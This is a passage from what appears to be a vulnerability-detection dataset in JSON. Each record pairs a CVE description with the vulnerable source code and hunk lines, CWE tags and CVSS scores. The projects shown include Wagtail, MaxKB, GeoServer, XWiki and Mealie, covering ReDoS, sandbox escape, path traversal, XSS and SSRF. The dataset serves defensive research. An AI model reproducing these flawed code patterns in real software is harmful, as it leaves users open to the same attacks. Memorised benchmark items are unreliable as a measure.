        "func (u *AuthService) LogOut(c *gin.Context) error {\n\tsID, _ := c.Cookie(constant.SessionName)\n\tif sID != \"\" {\n\t\tc.SetCookie(constant.SessionName, sID, -1, \"\", \"\", false, false)\n\t\terr := global.SESSION.Delete(sID)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\treturn nil\n}"
      ],
      "hunk_level": [
        {
          "line_no": 132,
          "content": "\t\tc.SetCookie(constant.SessionName, sID, 0, \"\", \"\", false, false)"
        },
        {
          "line_no": 149,
          "content": "\t\tc.SetCookie(constant.SessionName, sID, -1, \"\", \"\", false, false)"
        }
      ]
    },
    "cwe": [
      "CWE-311",
      "CWE-315"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 967,
    "cve": "CVE-2024-39317",
    "description": "Wagtail is an open source content management system built on Django. A bug in Wagtail's `parse_query_string` would result in it taking a long time to process suitably crafted inputs. When used to parse sufficiently long strings of characters without a space, `parse_query_string` would take an unexpectedly large amount of time to process, resulting in a denial of service. In an initial Wagtail installation, the vulnerability can be exploited by any Wagtail admin user. It cannot be exploited by end users. If your Wagtail site has a custom search implementation which uses `parse_query_string`, it may be exploitable by other users (e.g. unauthenticated users). Patched versions have been released as Wagtail 5.2.6, 6.0.6 and 6.1.3.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "wagtail/search/utils.py",
          "content": "import operator\nimport re\nfrom functools import partial\n\nfrom django.apps import apps\nfrom django.db import connections\nfrom django.http import QueryDict\n\nfrom wagtail.search.index import RelatedFields, SearchField\n\nfrom .query import MATCH_NONE, Phrase, PlainText\n\nNOT_SET = object()\n\n\ndef balanced_reduce(operator, seq, initializer=NOT_SET):\n    \"\"\"\n    Has the same result as Python's reduce function, but performs the calculations in a different order.\n\n    This is important when the operator is constructing data structures such as search query classes.\n    This method will make the resulting data structures flatter, so operations that need to traverse\n    them don't end up crashing with recursion errors.\n\n    For example:\n\n    Python's builtin reduce() function will do the following calculation:\n\n    reduce(add, [1, 2, 3, 4, 5, 6, 7, 8])\n    (1 + (2 + (3 + (4 + (5 + (6 + (7 + 8)))))))\n\n    When using this with query classes, it would create a large data structure with a depth of 7\n    Whereas balanced_reduce will execute this like so:\n\n    balanced_reduce(add, [1, 2, 3, 4, 5, 6, 7, 8])\n    ((1 + 2) + (3 + 4)) + ((5 + 6) + (7 + 8))\n\n    Which only has a depth of 2\n    \"\"\"\n    # Casting all iterables to list makes the implementation simpler\n    if not isinstance(seq, list):\n        seq = list(seq)\n\n    # Note, it needs to be possible to use None as an initial value\n    if initializer is not NOT_SET:\n        if len(seq) == 0:\n            return initializer\n        else:\n            return operator(initializer, balanced_reduce(operator, seq))\n\n    if len(seq) == 0:\n        raise TypeError(\"reduce() of empty sequence with no initial value\")\n    elif len(seq) == 1:\n        return seq[0]\n    else:\n        break_point = len(seq) // 2\n        first_set = balanced_reduce(operator, seq[:break_point])\n        second_set = balanced_reduce(operator, seq[break_point:])\n        return operator(first_set, second_set)\n\n\n# Reduce any iterable to a single value using a logical OR e.g. (a | b | ...)\nOR = partial(balanced_reduce, operator.or_)\n# Reduce any iterable to a single value using a logical AND e.g. (a & b & ...)\nAND = partial(balanced_reduce, operator.and_)\n# Reduce any iterable to a single value using an addition\nADD = partial(balanced_reduce, operator.add)\n# Reduce any iterable to a single value using a multiplication\nMUL = partial(balanced_reduce, operator.mul)\n\nMAX_QUERY_STRING_LENGTH = 255\n\n\ndef normalise_query_string(query_string):\n    # Truncate query string\n    query_string = query_string[:MAX_QUERY_STRING_LENGTH]\n    # Convert query_string to lowercase\n    query_string = query_string.lower()\n\n    # Remove leading, trailing and multiple spaces\n    query_string = re.sub(\" +\", \" \", query_string).strip()\n\n    return query_string\n\n\ndef separate_filters_from_query(query_string):\n    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'\n\n    filters = QueryDict(mutable=True)\n    for match_object in re.finditer(filters_regexp, query_string):\n        key, value = match_object.groups()\n        filters.update(\n            {\n                key: value.strip('\"')\n                if value.strip('\"') is not value\n                else value.strip(\"'\")\n            }\n        )\n\n    query_string = re.sub(filters_regexp, \"\", query_string).strip()\n\n    return filters, query_string\n\n\ndef parse_query_string(query_string, operator=None, zero_terms=MATCH_NONE):\n    \"\"\"\n    This takes a query string typed in by a user and extracts the following:\n\n     - Quoted terms (for phrase search)\n     - Filters\n\n    For example, the following query:\n\n      `hello \"this is a phrase\" live:true` would be parsed into:\n\n    filters: {'live': 'true'}\n    tokens: And([PlainText('hello'), Phrase('this is a phrase')])\n    \"\"\"\n    filters, query_string = separate_filters_from_query(query_string)\n\n    is_phrase = False\n    tokens = []\n    if '\"' in query_string:\n        parts = query_string.split('\"')\n    else:\n        parts = query_string.split(\"'\")\n\n    for part in parts:\n        part = part.strip()\n\n        if part:\n            if is_phrase:\n                tokens.append(Phrase(part))\n            else:\n                tokens.append(\n                    PlainText(part, operator=operator or PlainText.DEFAULT_OPERATOR)\n                )\n\n        is_phrase = not is_phrase\n\n    if tokens:\n        if operator == \"or\":\n            search_query = OR(tokens)\n        else:\n            search_query = AND(tokens)\n    else:\n        search_query = zero_terms\n\n    return filters, search_query\n\n\ndef get_descendant_models(model):\n    \"\"\"\n    Returns all descendants of a model, including the model itself.\n    \"\"\"\n    descendant_models = {\n        other_model\n        for other_model in apps.get_models()\n        if issubclass(other_model, model)\n    }\n    descendant_models.add(model)\n    return descendant_models\n\n\ndef get_content_type_pk(model):\n    # We import it locally because this file is loaded before apps are ready.\n    from django.contrib.contenttypes.models import ContentType\n\n    return ContentType.objects.get_for_model(model).pk\n\n\ndef get_ancestors_content_types_pks(model):\n    \"\"\"\n    Returns content types ids for the ancestors of this model, excluding it.\n    \"\"\"\n    from django.contrib.contenttypes.models import ContentType\n\n    return [\n        ct.pk\n        for ct in ContentType.objects.get_for_models(\n            *model._meta.get_parent_list()\n        ).values()\n    ]\n\n\ndef get_descendants_content_types_pks(model):\n    \"\"\"\n    Returns content types ids for the descendants of this model, including it.\n    \"\"\"\n    from django.contrib.contenttypes.models import ContentType\n\n    return [\n        ct.pk\n        for ct in ContentType.objects.get_for_models(\n            *get_descendant_models(model)\n        ).values()\n    ]\n\n\ndef get_search_fields(search_fields):\n    for search_field in search_fields:\n        if isinstance(search_field, SearchField):\n            yield search_field\n        elif isinstance(search_field, RelatedFields):\n            yield from get_search_fields(search_field.fields)\n\n\ndef get_postgresql_connections():\n    return [\n        connection\n        for connection in connections.all()\n        if connection.vendor == \"postgresql\"\n    ]\n"
        }
      ],
      "method_level": [
        "def separate_filters_from_query(query_string):\n    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'\n\n    filters = QueryDict(mutable=True)\n    for match_object in re.finditer(filters_regexp, query_string):\n        key, value = match_object.groups()\n        filters.update(\n            {\n                key: value.strip('\"')\n                if value.strip('\"') is not value\n                else value.strip(\"'\")\n            }\n        )\n\n    query_string = re.sub(filters_regexp, \"\", query_string).strip()\n\n    return filters, query_string"
      ],
      "hunk_level": [
        {
          "line_no": 86,
          "content": "    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'"
        },
        {
          "line_no": 89,
          "content": "    for match_object in re.finditer(filters_regexp, query_string):"
        },
        {
          "line_no": 91,
          "content": "        filters.update("
        },
        {
          "line_no": 92,
          "content": "            {"
        },
        {
          "line_no": 93,
          "content": "                key: value.strip('\"')"
        },
        {
          "line_no": 94,
          "content": "                if value.strip('\"') is not value"
        },
        {
          "line_no": 95,
          "content": "                else value.strip(\"'\")"
        },
        {
          "line_no": 96,
          "content": "            }"
        },
        {
          "line_no": 97,
          "content": "        )"
        },
        {
          "line_no": 99,
          "content": "    query_string = re.sub(filters_regexp, \"\", query_string).strip()"
        }
      ]
    },
    "cwe": [
      "CWE-1333"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 97,
    "cve": "CVE-2025-32383",
    "description": "MaxKB (Max Knowledge Base) is an open source knowledge base question-answering system based on a large language model and retrieval-augmented generation (RAG). A reverse shell vulnerability exists in the module of function library. The vulnerability allow privileged‌ users to create a reverse shell. This vulnerability is fixed in v1.10.4-lts.",
    "vulnerability": {
      "file_level": [
        {
          "name": "apps/common/util/function_code.py",
          "content": "# coding=utf-8\n\"\"\"\n    @project: MaxKB\n    @Author：虎\n    @file： function_code.py\n    @date：2024/8/7 16:11\n    @desc:\n\"\"\"\nimport os\nimport subprocess\nimport sys\nimport uuid\nfrom textwrap import dedent\n\nfrom diskcache import Cache\n\nfrom smartdoc.const import BASE_DIR\nfrom smartdoc.const import PROJECT_DIR\n\npython_directory = sys.executable\n\n\nclass FunctionExecutor:\n    def __init__(self, sandbox=False):\n        self.sandbox = sandbox\n        if sandbox:\n            self.sandbox_path = '/opt/maxkb/app/sandbox'\n            self.user = 'sandbox'\n        else:\n            self.sandbox_path = os.path.join(PROJECT_DIR, 'data', 'sandbox')\n            self.user = None\n        self._createdir()\n        if self.sandbox:\n            os.system(f\"chown -R {self.user}:root {self.sandbox_path}\")\n\n    def _createdir(self):\n        old_mask = os.umask(0o077)\n        try:\n            os.makedirs(self.sandbox_path, 0o700, exist_ok=True)\n        finally:\n            os.umask(old_mask)\n\n    def exec_code(self, code_str, keywords):\n        _id = str(uuid.uuid1())\n        success = '{\"code\":200,\"msg\":\"成功\",\"data\":exec_result}'\n        err = '{\"code\":500,\"msg\":str(e),\"data\":None}'\n        path = r'' + self.sandbox_path + ''\n        _exec_code = f\"\"\"\ntry:\n    import os\n    env = dict(os.environ)\n    for key in list(env.keys()):\n        if key in os.environ and (key.startswith('MAXKB') or key.startswith('POSTGRES') or key.startswith('PG')):\n            del os.environ[key]\n    locals_v={'{}'}\n    keywords={keywords}\n    globals_v=globals()\n    exec({dedent(code_str)!a}, globals_v, locals_v)\n    f_name, f = locals_v.popitem()\n    for local in locals_v:\n        globals_v[local] = locals_v[local]\n    exec_result=f(**keywords)\n    from diskcache import Cache\n    cache = Cache({path!a})\n    cache.set({_id!a},{success})\nexcept Exception as e:\n    from diskcache import Cache\n    cache = Cache({path!a})\n    cache.set({_id!a},{err})\n\"\"\"\n        if self.sandbox:\n            subprocess_result = self._exec_sandbox(_exec_code, _id)\n        else:\n            subprocess_result = self._exec(_exec_code)\n        if subprocess_result.returncode == 1:\n            raise Exception(subprocess_result.stderr)\n        cache = Cache(self.sandbox_path)\n        result = cache.get(_id)\n        cache.delete(_id)\n        if result.get('code') == 200:\n            return result.get('data')\n        raise Exception(result.get('msg'))\n\n    def _exec_sandbox(self, _code, _id):\n        exec_python_file = f'{self.sandbox_path}/{_id}.py'\n        with open(exec_python_file, 'w') as file:\n            file.write(_code)\n            os.system(f\"chown {self.user}:{self.user} {exec_python_file}\")\n        kwargs = {'cwd': BASE_DIR}\n        subprocess_result = subprocess.run(\n            ['su', '-c', python_directory + ' ' + exec_python_file, self.user],\n            text=True,\n            capture_output=True, **kwargs)\n        os.remove(exec_python_file)\n        return subprocess_result\n\n    @staticmethod\n    def _exec(_code):\n        return subprocess.run([python_directory, '-c', _code], text=True, capture_output=True)\n"
        }
      ],
      "method_level": [
        "def _exec_sandbox(self, _code, _id):\n        exec_python_file = f'{self.sandbox_path}/{_id}.py'\n        with open(exec_python_file, 'w') as file:\n            file.write(_code)\n            os.system(f\"chown {self.user}:{self.user} {exec_python_file}\")\n        kwargs = {'cwd': BASE_DIR}\n        subprocess_result = subprocess.run(\n            ['su', '-c', python_directory + ' ' + exec_python_file, self.user],\n            text=True,\n            capture_output=True, **kwargs)\n        os.remove(exec_python_file)\n        return subprocess_result"
      ],
      "hunk_level": [
        {
          "line_no": 91,
          "content": "            ['su', '-c', python_directory + ' ' + exec_python_file, self.user],"
        }
      ]
    },
    "cwe": [
      "CWE-94"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.3,
    "cvss_version": 3.1
  },
  {
    "id": 903,
    "cve": "CVE-2024-24749",
    "description": "GeoServer is an open source server that allows users to share and edit geospatial data. Prior to versions 2.23.5 and 2.24.3, if GeoServer is deployed in the Windows operating system using an Apache Tomcat web application server, it is possible to bypass existing input validation in the GeoWebCache ByteStreamController class and read arbitrary classpath resources with specific file name extensions. If GeoServer is also deployed as a web archive using the data directory embedded in the `geoserver.war` file (rather than an external data directory), it will likely be possible to read specific resources to gain administrator privileges. However, it is very unlikely that production environments will be using the embedded data directory since, depending on how GeoServer is deployed, it will be erased and re-installed (which would also reset to the default password) either every time the server restarts or every time a new GeoServer WAR is installed and is therefore difficult to maintain. An external data directory will always be used if GeoServer is running in standalone mode (via an installer or a binary). Versions 2.23.5 and 2.24.3 contain a patch for the issue. Some workarounds are available. One may change from a Windows environment to a Linux environment; or change from Apache Tomcat to Jetty application server. One may also disable anonymous access to the embeded GeoWebCache administration and status pages.",
    "vulnerability": {
      "file_level": [
        {
          "name": "geowebcache/rest/src/main/java/org/geowebcache/rest/controller/ByteStreamController.java",
          "content": "/**\n * This program is free software: you can redistribute it and/or modify it under the terms of the\n * GNU Lesser General Public License as published by the Free Software Foundation, either version 3\n * of the License, or (at your option) any later version.\n *\n * <p>This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;\n * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n * GNU General Public License for more details.\n *\n * <p>You should have received a copy of the GNU Lesser General Public License along with this\n * program. If not, see <http://www.gnu.org/licenses/>.\n *\n * @author David Vick, Boundless, Copyright 2017\n *     <p>File was reworked from ByteStreamerRestlet.java\n */\npackage org.geowebcache.rest.controller;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URL;\nimport java.net.URLDecoder;\nimport java.util.List;\nimport java.util.logging.Logger;\nimport java.util.regex.Pattern;\nimport javax.servlet.ServletOutputStream;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport org.geotools.util.logging.Logging;\nimport org.geowebcache.GeoWebCacheExtensions;\nimport org.geowebcache.mime.MimeException;\nimport org.geowebcache.mime.MimeType;\nimport org.geowebcache.rest.webresources.WebResourceBundle;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.stereotype.Component;\nimport org.springframework.util.StreamUtils;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestMethod;\nimport org.springframework.web.bind.annotation.RestController;\n\n@Component\n@RestController\n@RequestMapping(path = \"${gwc.context.suffix:}/rest\")\npublic class ByteStreamController {\n    private static Logger log = Logging.getLogger(ByteStreamController.class.getName());\n\n    volatile WebResourceBundle bundle;\n\n    private static final WebResourceBundle DEFAULT_BUNDLE = WebResourceBundle.class::getResource;\n\n    protected URL getResource(String path) {\n        if (bundle == null) {\n            synchronized (this) {\n                if (bundle == null) {\n                    List<WebResourceBundle> result =\n                            GeoWebCacheExtensions.extensions(WebResourceBundle.class);\n                    if (result.isEmpty()) {\n                        bundle = DEFAULT_BUNDLE;\n                    } else {\n                        if (result.size() > 1) {\n                            log.warning(\n                                    \"Multiple web resource bundles present, using \"\n                                            + result.get(0).getClass().getName());\n                        }\n                        bundle = result.get(0);\n                    }\n                }\n            }\n        }\n        URL resource = bundle.apply(path);\n        if (resource == null && bundle != DEFAULT_BUNDLE) {\n            resource = DEFAULT_BUNDLE.apply(path);\n        }\n        return resource;\n    }\n\n    static final Pattern UNSAFE_RESOURCE = Pattern.compile(\"^/|/\\\\.\\\\./|^\\\\.\\\\./|\\\\.class$\");\n\n    // \"gwc/rest/web/openlayers3/ol.js\" -> openlayers3/ol.js\n    // \"/rest/web/openlayers3/ol.js\" -> openlayers3/ol.js\n    String getFileName(HttpServletRequest request) {\n        String path = request.getPathInfo();\n        if (path.indexOf(\"/rest/web\") != 0) {\n            path = path.substring(path.indexOf(\"/rest/web\"));\n        }\n        return path.substring(\"/rest/web/\".length());\n    }\n\n    @RequestMapping(value = \"/web/**\", method = RequestMethod.GET)\n    ResponseEntity<?> doGet(HttpServletRequest request, HttpServletResponse response) {\n        final String filename;\n        try {\n            filename = URLDecoder.decode(getFileName(request), \"UTF-8\");\n        } catch (UnsupportedEncodingException e1) {\n            throw new IllegalStateException(\n                    \"Could not decode encoding UTF-8\", e1); // Should never happen\n        }\n\n        // Just to make sure we don't allow access to arbitrary resources\n        if (UNSAFE_RESOURCE.matcher(filename).find()) {\n            return new ResponseEntity<>(HttpStatus.FORBIDDEN);\n        }\n\n        URL resource = getResource(filename);\n        if (resource == null) {\n            return new ResponseEntity<>(HttpStatus.NOT_FOUND);\n        }\n\n        String[] filenameParts = filename.split(\"\\\\.\");\n        String extension = filenameParts[filenameParts.length - 1];\n\n        MimeType mime = null;\n        try {\n            mime = MimeType.createFromExtension(extension);\n        } catch (MimeException e) {\n            return new ResponseEntity<Object>(\n                    \"Unable to create MimeType for \" + extension, HttpStatus.INTERNAL_SERVER_ERROR);\n        }\n\n        // TODO write ByteArrayOutputStream ResponseEntity\n\n        response.setContentType(mime.getFormat());\n        try (InputStream inputStream = resource.openStream();\n                ServletOutputStream outputStream = response.getOutputStream(); ) {\n            StreamUtils.copy(inputStream, outputStream);\n        } catch (IOException e) {\n            return new ResponseEntity<Object>(\"Internal error\", HttpStatus.INTERNAL_SERVER_ERROR);\n        }\n\n        return new ResponseEntity<>(HttpStatus.OK);\n    }\n}\n"
        }
      ],
      "method_level": [
        "String getFileName(HttpServletRequest request) {\n        String path = request.getPathInfo();\n        if (path.indexOf(\"/rest/web\") != 0) {\n            path = path.substring(path.indexOf(\"/rest/web\"));\n        }\n        return path.substring(\"/rest/web/\".length());\n    }",
        "@RequestMapping(value = \"/web/**\", method = RequestMethod.GET)\n    ResponseEntity<?> doGet(HttpServletRequest request, HttpServletResponse response) {\n        final String filename;\n        try {\n            filename = URLDecoder.decode(getFileName(request), \"UTF-8\");\n        } catch (UnsupportedEncodingException e1) {\n            throw new IllegalStateException(\n                    \"Could not decode encoding UTF-8\", e1); // Should never happen\n        }\n\n        // Just to make sure we don't allow access to arbitrary resources\n        if (UNSAFE_RESOURCE.matcher(filename).find()) {\n            return new ResponseEntity<>(HttpStatus.FORBIDDEN);\n        }\n\n        URL resource = getResource(filename);\n        if (resource == null) {\n            return new ResponseEntity<>(HttpStatus.NOT_FOUND);\n        }\n\n        String[] filenameParts = filename.split(\"\\\\.\");\n        String extension = filenameParts[filenameParts.length - 1];\n\n        MimeType mime = null;\n        try {\n            mime = MimeType.createFromExtension(extension);\n        } catch (MimeException e) {\n            return new ResponseEntity<Object>(\n                    \"Unable to create MimeType for \" + extension, HttpStatus.INTERNAL_SERVER_ERROR);\n        }\n\n        // TODO write ByteArrayOutputStream ResponseEntity\n\n        response.setContentType(mime.getFormat());\n        try (InputStream inputStream = resource.openStream();\n                ServletOutputStream outputStream = response.getOutputStream(); ) {\n            StreamUtils.copy(inputStream, outputStream);\n        } catch (IOException e) {\n            return new ResponseEntity<Object>(\"Internal error\", HttpStatus.INTERNAL_SERVER_ERROR);\n        }\n\n        return new ResponseEntity<>(HttpStatus.OK);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 82,
          "content": "    String getFileName(HttpServletRequest request) {"
        },
        {
          "line_no": 83,
          "content": "        String path = request.getPathInfo();"
        },
        {
          "line_no": 84,
          "content": "        if (path.indexOf(\"/rest/web\") != 0) {"
        },
        {
          "line_no": 85,
          "content": "            path = path.substring(path.indexOf(\"/rest/web\"));"
        },
        {
          "line_no": 86,
          "content": "        }"
        },
        {
          "line_no": 87,
          "content": "        return path.substring(\"/rest/web/\".length());"
        },
        {
          "line_no": 91,
          "content": "    ResponseEntity<?> doGet(HttpServletRequest request, HttpServletResponse response) {"
        },
        {
          "line_no": 92,
          "content": "        final String filename;"
        },
        {
          "line_no": 93,
          "content": "        try {"
        },
        {
          "line_no": 94,
          "content": "            filename = URLDecoder.decode(getFileName(request), \"UTF-8\");"
        },
        {
          "line_no": 95,
          "content": "        } catch (UnsupportedEncodingException e1) {"
        },
        {
          "line_no": 96,
          "content": "            throw new IllegalStateException("
        },
        {
          "line_no": 97,
          "content": "                    \"Could not decode encoding UTF-8\", e1); // Should never happen"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.1
  },
  {
    "id": 1093,
    "cve": "CVE-2024-43400",
    "description": "XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. It is possible for a user without Script or Programming rights to craft a URL pointing to a page with arbitrary JavaScript. This requires social engineer to trick a user to follow the URL. This has been patched in XWiki 14.10.21, 15.5.5, 15.10.6 and 16.0.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-oldcore/src/main/java/com/xpn/xwiki/objects/classes/StringClass.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage com.xpn.xwiki.objects.classes;\n\nimport org.apache.ecs.xhtml.input;\nimport org.xwiki.xml.XMLUtils;\n\nimport com.xpn.xwiki.XWiki;\nimport com.xpn.xwiki.XWikiContext;\nimport com.xpn.xwiki.internal.xml.XMLAttributeValueFilter;\nimport com.xpn.xwiki.objects.BaseCollection;\nimport com.xpn.xwiki.objects.BaseProperty;\nimport com.xpn.xwiki.objects.StringProperty;\nimport com.xpn.xwiki.objects.meta.PropertyMetaClass;\n\npublic class StringClass extends PropertyClass\n{\n    private static final long serialVersionUID = 1L;\n\n    private static final String XCLASSNAME = \"string\";\n\n    public StringClass(String name, String prettyname, PropertyMetaClass wclass)\n    {\n        super(name, prettyname, wclass);\n        setSize(30);\n    }\n\n    public StringClass(PropertyMetaClass wclass)\n    {\n        this(XCLASSNAME, \"String\", wclass);\n    }\n\n    public StringClass()\n    {\n        this(null);\n    }\n\n    public int getSize()\n    {\n        return getIntValue(\"size\");\n    }\n\n    public void setSize(int size)\n    {\n        setIntValue(\"size\", size);\n    }\n\n    public boolean isPicker()\n    {\n        return (getIntValue(\"picker\") == 1);\n    }\n\n    public void setPicker(boolean picker)\n    {\n        setIntValue(\"picker\", picker ? 1 : 0);\n    }\n\n    @Override\n    public BaseProperty fromString(String value)\n    {\n        BaseProperty property = newProperty();\n        property.setValue(value);\n        return property;\n    }\n\n    @Override\n    public BaseProperty newProperty()\n    {\n        BaseProperty property = new StringProperty();\n        property.setName(getName());\n        return property;\n    }\n\n    @Override\n    public void displayEdit(StringBuffer buffer, String name, String prefix, BaseCollection object, XWikiContext context)\n    {\n        input input = new input();\n        input.setAttributeFilter(new XMLAttributeValueFilter());\n        BaseProperty prop = (BaseProperty) object.safeget(name);\n        if (prop != null) {\n            input.setValue(prop.toText());\n        }\n\n        input.setType(\"text\");\n        input.setName(prefix + name);\n        input.setID(prefix + name);\n        input.setSize(getSize());\n        input.setDisabled(isDisabled());\n\n        if (isPicker()) {\n            input.setClass(\"suggested\");\n            String path = \"\";\n            XWiki xwiki = context.getWiki();\n            path = xwiki.getURL(\"Main.WebHome\", \"view\", context);\n\n            String classname = this.getObject().getName();\n            String fieldname = this.getName();\n            String secondCol = \"-\", firstCol = \"-\";\n\n            String script =\n                \"\\\"\" + path + \"?xpage=suggest&classname=\" + classname + \"&fieldname=\" + fieldname + \"&firCol=\"\n                    + firstCol + \"&secCol=\" + secondCol + \"&\\\"\";\n            String varname = \"\\\"input\\\"\";\n            input.setOnFocus(\"new ajaxSuggest(this, {script:\" + script + \", varname:\" + varname + \"} )\");\n        }\n\n        buffer.append(input.toString());\n    }\n\n    @Override\n    public void displayView(StringBuffer buffer, String name, String prefix, BaseCollection object,\n        XWikiContext context)\n    {\n        BaseProperty property = (BaseProperty) object.safeget(name);\n        if (property != null) {\n            buffer.append(XMLUtils.escapeElementText(property.toText()));\n        }\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Override\n    public void displayEdit(StringBuffer buffer, String name, String prefix, BaseCollection object, XWikiContext context)\n    {\n        input input = new input();\n        input.setAttributeFilter(new XMLAttributeValueFilter());\n        BaseProperty prop = (BaseProperty) object.safeget(name);\n        if (prop != null) {\n            input.setValue(prop.toText());\n        }\n\n        input.setType(\"text\");\n        input.setName(prefix + name);\n        input.setID(prefix + name);\n        input.setSize(getSize());\n        input.setDisabled(isDisabled());\n\n        if (isPicker()) {\n            input.setClass(\"suggested\");\n            String path = \"\";\n            XWiki xwiki = context.getWiki();\n            path = xwiki.getURL(\"Main.WebHome\", \"view\", context);\n\n            String classname = this.getObject().getName();\n            String fieldname = this.getName();\n            String secondCol = \"-\", firstCol = \"-\";\n\n            String script =\n                \"\\\"\" + path + \"?xpage=suggest&classname=\" + classname + \"&fieldname=\" + fieldname + \"&firCol=\"\n                    + firstCol + \"&secCol=\" + secondCol + \"&\\\"\";\n            String varname = \"\\\"input\\\"\";\n            input.setOnFocus(\"new ajaxSuggest(this, {script:\" + script + \", varname:\" + varname + \"} )\");\n        }\n\n        buffer.append(input.toString());\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 92,
          "content": "    public void displayEdit(StringBuffer buffer, String name, String prefix, BaseCollection object, XWikiContext context)"
        },
        {
          "line_no": 108,
          "content": "            input.setClass(\"suggested\");"
        },
        {
          "line_no": 109,
          "content": "            String path = \"\";"
        },
        {
          "line_no": 110,
          "content": "            XWiki xwiki = context.getWiki();"
        },
        {
          "line_no": 111,
          "content": "            path = xwiki.getURL(\"Main.WebHome\", \"view\", context);"
        },
        {
          "line_no": 113,
          "content": "            String classname = this.getObject().getName();"
        },
        {
          "line_no": 114,
          "content": "            String fieldname = this.getName();"
        },
        {
          "line_no": 115,
          "content": "            String secondCol = \"-\", firstCol = \"-\";"
        },
        {
          "line_no": 117,
          "content": "            String script ="
        },
        {
          "line_no": 118,
          "content": "                \"\\\"\" + path + \"?xpage=suggest&classname=\" + classname + \"&fieldname=\" + fieldname + \"&firCol=\""
        },
        {
          "line_no": 119,
          "content": "                    + firstCol + \"&secCol=\" + secondCol + \"&\\\"\";"
        },
        {
          "line_no": 120,
          "content": "            String varname = \"\\\"input\\\"\";"
        },
        {
          "line_no": 121,
          "content": "            input.setOnFocus(\"new ajaxSuggest(this, {script:\" + script + \", varname:\" + varname + \"} )\");"
        },
        {
          "line_no": 124,
          "content": "        buffer.append(input.toString());"
        }
      ]
    },
    "cwe": [
      "CWE-96",
      "CWE-79"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.0,
    "cvss_version": 3.1
  },
  {
    "id": 695,
    "cve": "CVE-2024-31993",
    "description": "Mealie is a self hosted recipe manager and meal planner. Prior to 1.4.0, the scrape_image function will retrieve an image based on a user-provided URL, however the provided URL is not validated to point to an external location and does not have any enforced rate limiting. The response from the Mealie server will also vary depending on whether or not the target file is an image, is not an image, or does not exist. Additionally, when a file is retrieved the file may remain stored on Mealie’s file system as original.jpg under the UUID of the recipe it was requested for. If the attacker has access to an admin account (e.g. the default changeme@example.com), this file can then be retrieved. Note that if Mealie is running in a development setting this could be leveraged by an attacker to retrieve any file that the Mealie server had downloaded in this fashion without the need for administrator access. This vulnerability is fixed in 1.4.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "mealie/services/recipe/recipe_data_service.py",
          "content": "import asyncio\nimport shutil\nfrom pathlib import Path\n\nfrom httpx import AsyncClient, Response\nfrom pydantic import UUID4\n\nfrom mealie.pkgs import img\nfrom mealie.schema.recipe.recipe import Recipe\nfrom mealie.services._base_service import BaseService\n\n_FIREFOX_UA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0\"\n\n\nasync def gather_with_concurrency(n, *coros, ignore_exceptions=False):\n    semaphore = asyncio.Semaphore(n)\n\n    async def sem_coro(coro):\n        async with semaphore:\n            return await coro\n\n    results = await asyncio.gather(*(sem_coro(c) for c in coros), return_exceptions=ignore_exceptions)\n    if ignore_exceptions:\n        results = [r for r in results if not isinstance(r, Exception)]\n    return results\n\n\nasync def largest_content_len(urls: list[str]) -> tuple[str, int]:\n    largest_url = \"\"\n    largest_len = 0\n\n    async def do(client: AsyncClient, url: str) -> Response:\n        return await client.head(url, headers={\"User-Agent\": _FIREFOX_UA})\n\n    async with AsyncClient() as client:\n        tasks = [do(client, url) for url in urls]\n        responses: list[Response] = await gather_with_concurrency(10, *tasks, ignore_exceptions=True)\n        for response in responses:\n            len_int = int(response.headers.get(\"Content-Length\", 0))\n            if len_int > largest_len:\n                largest_url = str(response.url)\n                largest_len = len_int\n\n    return largest_url, largest_len\n\n\nclass NotAnImageError(Exception):\n    pass\n\n\nclass InvalidDomainError(Exception):\n    pass\n\n\nclass RecipeDataService(BaseService):\n    minifier: img.ABCMinifier\n\n    def __init__(self, recipe_id: UUID4, group_id: UUID4 | None = None) -> None:\n        \"\"\"\n        RecipeDataService is a service that consolidates the reading/writing actions related\n        to assets, and images for a recipe.\n        \"\"\"\n        super().__init__()\n\n        self.recipe_id = recipe_id\n        self.slug = group_id\n        self.minifier = img.PillowMinifier(purge=True, logger=self.logger)\n\n        self.dir_data = 